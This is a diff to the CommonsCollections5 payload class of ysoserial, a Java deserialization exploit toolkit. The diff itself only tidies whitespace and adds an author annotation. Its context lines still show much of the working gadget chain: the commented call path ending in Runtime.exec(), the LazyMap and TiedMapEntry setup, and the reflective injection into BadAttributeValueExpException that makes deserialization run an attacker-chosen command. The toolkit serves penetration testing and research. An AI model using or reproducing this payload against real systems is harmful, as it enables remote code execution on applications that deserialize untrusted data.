@@ -14,6 +14,7 @@ import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
@@ -21,7 +22,7 @@ import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
 /*
-	Gadget chain:	
+	Gadget chain:
 		ObjectInputStream.readObject()
 			AnnotationInvocationHandler.readObject()
 				Map(Proxy).entrySet()
@@ -30,23 +31,24 @@ import ysoserial.payloads.util.Reflections;
 							ChainedTransformer.transform()
 								ConstantTransformer.transform()
 								InvokerTransformer.transform()
-									Method.invoke()				
+									Method.invoke()
 										Class.getMethod()
 								InvokerTransformer.transform()
 									Method.invoke()
 										Runtime.getRuntime()
 								InvokerTransformer.transform()
 									Method.invoke()
-										Runtime.exec()										
-	
+										Runtime.exec()
+
 	Requires:
 		commons-collections
  */
 @PayloadTest(skip="need more robust way to detect Runtime.exec() without SecurityManager()")
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
+@Authors({ Authors.FROHOFF })
 public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
-	
+
 	public BadAttributeValueExpException getObject(final String command) throws Exception {
 		final String[] execArgs = new String[] { command };
 		// inert chain for setup
@@ -68,9 +70,9 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 		final Map innerMap = new HashMap();
 
 		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-		
+
 		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
-		
+
 		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
 		Field valfield = val.getClass().getDeclaredField("val");
 		valfield.setAccessible(true);
@@ -80,7 +82,7 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 
 		return val;
 	}
-	
+
 	public static void main(final String[] args) throws Exception {
 		PayloadRunner.run(CommonsCollections5.class, args);
 	}
